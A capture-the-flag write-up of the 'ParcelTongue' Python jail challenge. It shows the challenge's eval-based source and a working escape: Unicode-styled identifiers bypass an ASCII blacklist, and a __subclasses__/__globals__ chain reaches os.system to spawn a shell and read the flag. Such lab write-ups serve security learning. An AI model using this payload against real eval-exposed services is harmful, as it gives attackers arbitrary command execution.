---
title: "HackTheBox ParcelTongue Misc Write up"
date: 2022-09-18T15:19:56+01:00
draft: false
toc: false
images:
tags:
  - ctf
  - python
  - writeup
---
This is a write up for the WSI UK CTF challenge ParcelTongue in the Misc challenge. This challenge involves a server that is hosting a PyJail netcat connection. Included in the challenge is the source code for the Python program seen below:

```python
#!/usr/bin/env python3
import string
blacklist = string.ascii_letters + '"\''

payload = input("𝒲𝒽𝒶𝓉 𝓌𝑜𝓊𝓁𝒹 𝓎𝑜𝓊 𝓁𝒾𝓀𝑒 𝓂𝑒 𝓉𝑜 𝒹𝑜? ")
if any(filter(lambda c: c in blacklist, payload)):
    print("𝐼 𝒹𝑜𝓃'𝓉 𝓊𝓃𝒹𝑒𝓇𝓈𝓉𝒶𝓃𝒹 𝓌𝒽𝒶𝓉 𝓎𝑜𝓊 𝓂𝑒𝒶𝓃")
else:
    eval(payload)
```

Upon connecting to the netcat server. You give an input to the server which is then evaluated. However, as seen in the source code. All ascii letters and important punctuation is blacklisted. This is usually the base for PyJail challenges, however it has added difficulty by blocking all ascii text. This means that we cannot use even the most basic python functions.

### Enumeration

The first stage of solving this challenge is attempting to enumerate what can and cannot give as an input to the program. The goal being, to find a way to import ```os.system``` or similar python modules. 

The first thing I decided to investigate was specifically what the blacklist contains. This was done by just calling ascii_letters in python. From this output, I now now know the blacklist was upper and lowercase ascii, `"` and `'`.
```python
import string
print(string.ascii_letters)
>>> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
```

After a few minutes of messing with the program to no avail, I noticed that the program unusually used a hard-coded script font for printing text. Since there was no real reason for the program to use this I took it as a hint for the challenge. The script text used in the program is unicode, which can be read as python as legitimate text, but will not be included in the ascii_letters blacklist. 

Therefore, I went to [LingoJam]("https://lingojam.com/ItalicTextGenerator") to convert my normal ascii text some form of unicode. I first attempted printing an int as attempting to print a string would require using quotes, which don't convert to unicode. This was successful, and allowed to execute python code arbitrarily.

```python
𝒲𝒽𝒶𝓉 𝓌𝑜𝓊𝓁𝒹 𝓎𝑜𝓊 𝓁𝒾𝓀𝑒 𝓂𝑒 𝓉𝑜 𝒹𝑜? 𝘱𝘳𝘪𝘯𝘵(𝟣)
>>> 1
```

>_note, you can print strings by concatenating strings.ascii_letters function to spell out your string._ e.g.
```python
𝒲𝒽𝒶𝓉 𝓌𝑜𝓊𝓁𝒹 𝓎𝑜𝓊 𝓁𝒾𝓀𝑒 𝓂𝑒 𝓉𝑜 𝒹𝑜? 𝘱𝘳𝘪𝘯𝘵(𝘴𝘵𝘳𝘪𝘯𝘨.𝘢𝘴𝘤𝘪𝘪_𝘭𝘦𝘵𝘵𝘦𝘳𝘴[𝟩]+𝘴𝘵𝘳𝘪𝘯𝘨.𝘢𝘴𝘤𝘪𝘪_𝘭𝘦𝘵𝘵𝘦𝘳𝘴[𝟦]+𝘴𝘵𝘳𝘪𝘯𝘨.𝘢𝘴𝘤𝘪𝘪_𝘭𝘦𝘵𝘵𝘦𝘳𝘴[𝟣𝟣]+𝘴𝘵𝘳𝘪𝘯𝘨.𝘢𝘴𝘤𝘪𝘪_𝘭𝘦𝘵𝘵𝘦𝘳𝘴[𝟣𝟣]+𝘴𝘵𝘳𝘪𝘯𝘨.𝘢𝘴𝘤𝘪𝘪_𝘭𝘦𝘵𝘵𝘦𝘳𝘴[𝟣𝟦])
>>> hello
```

### Exploitation

The next step was to invoke os.system in order to get remote code execution. This can be done by chaining together class functions in order to invoke the module os. To do this you can call upon the `.__class__` attribute, this will will allow us to invoke a class through its attributes. Next you can invoke `.__base__`, which allows us to access the parent of a class. Finally, I can invoke `.__subclasses__`, which allows us to list all of the classes and attributes of a parent class.   

Combined together, this payload allows us to list, and invoke any class or module in the program. For this particular exploit you require `<class 'os._wrap_clas'>`. This was at position 137 for me. 
```python
().__class__.__base__.__subclasses__()[137]
>>> <class 'os._wrap_close'>
```
Next, I then needed to call the system function of the os module. This is done by availing of the `__global__` variable. This contains all functions in the global scope that have the same module as the provided scope. Therefore, if you use a module that exists in all scopes, like `.__init__`, you can call all functions and variables. Appending `.values()` means you can extract just the values from the `.__init__.__global__` functions returning dict. This `dict_values` can then be converted to a list by encasing it with `[*…]`, and iterated through to find the system function. This was at position 47 for me.
```python
[*().__class__.__base__.__subclasses__()[137].__init__.__globals__.values()][47]
>>> <built-in function system>
``` 

### Final payload
Now that I have found a way to call `os.system()`, I can now build a payload in order to gain shell access. The function os.system() requires input in the form of a string encased in quotes. However, as mentioned both single and double quotes are blacklisted.

This can be circumvented by using the same function from the script; `string.ascii_letters()`. If we call and concatenate `string.ascii_letters` for both letters **s** (18) and **h**, (7) we can invoke a shell through python. Once the payload is crafted, it can then be converted to a unicode text variant and input.

Doing so allowed me to gain a shell through the program and read flag.txt
```python
𝒲𝒽𝒶𝓉 𝓌𝑜𝓊𝓁𝒹 𝓎𝑜𝓊 𝓁𝒾𝓀𝑒 𝓂𝑒 𝓉𝑜 𝒹𝑜? [*().__𝒸𝓁𝒶𝓈𝓈__.__𝒷𝒶𝓈𝑒__.__𝓈𝓊𝒷𝒸𝓁𝒶𝓈𝓈𝑒𝓈__()[137].__𝒾𝓃𝒾𝓉__.__𝑔𝓁𝑜𝒷𝒶𝓁𝓈__.𝓋𝒶𝓁𝓊𝑒𝓈()][47](𝓈𝓉𝓇𝒾𝓃𝑔.𝒶𝓈𝒸𝒾𝒾_𝓁𝑒𝓉𝓉𝑒𝓇𝓈[18]+𝓈𝓉𝓇𝒾𝓃𝑔.𝒶𝓈𝒸𝒾𝒾_𝓁𝑒𝓉𝓉𝑒𝓇𝓈[7])
$ ls     
build-docker.sh  Dockerfile  flag.txt  server.py
$ cat flag.txt	
HTB{******************}
```